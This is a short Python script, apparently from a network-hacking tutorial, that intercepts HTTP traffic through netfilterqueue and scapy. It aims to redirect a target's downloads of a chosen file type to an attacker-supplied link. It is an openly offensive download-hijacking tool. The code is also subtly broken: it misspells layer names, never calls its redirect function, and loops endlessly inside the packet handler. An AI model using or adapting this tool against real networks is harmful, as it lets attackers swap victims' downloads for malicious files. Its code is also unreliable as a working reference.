#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--file_type", dest="file_type", help="Select file type exp. \".exe\"")
    parser.add_option("-l", "--link", dest="link", help="Link to download file")
    (options, arguments) = parser.parse_args()

    if not options.file_type:
        parser.error("[-] Please specify file type use --help for mor info.")
    elif not options.link:
        parser.error("[-] Please specify link to download, use --help for mor info.")

    return options

def set_load(packet):
    packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\n Location: " + options.link

    del packet[scapy.IP].len
    del packet[scapy.Ip].chksum
    del packet[scapy.TPC].chksum

    return packet

def process_packet(packet):
    try:
        while True:
            scapy_packet = scapy.IP(packet.get_payload())
            print(scapy_packet.show())
            if scapy_packet.haslayer(scapy.Raw):
                if scapy_packet[scapy.TCP].dport == 80:
                    print("[+] Request")
                    print(scapy_packet.show())
                elif scapy_packet[scapy.TCP].sport == 80:
                    print("[+] Response")
                    print(scapy_packet.show())


    except IndexError:
        print("This website is HTTPS")

        packet.accept()

options = get_arguments()

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("[-] Detected CTRL+C ... Stopped spoofing target")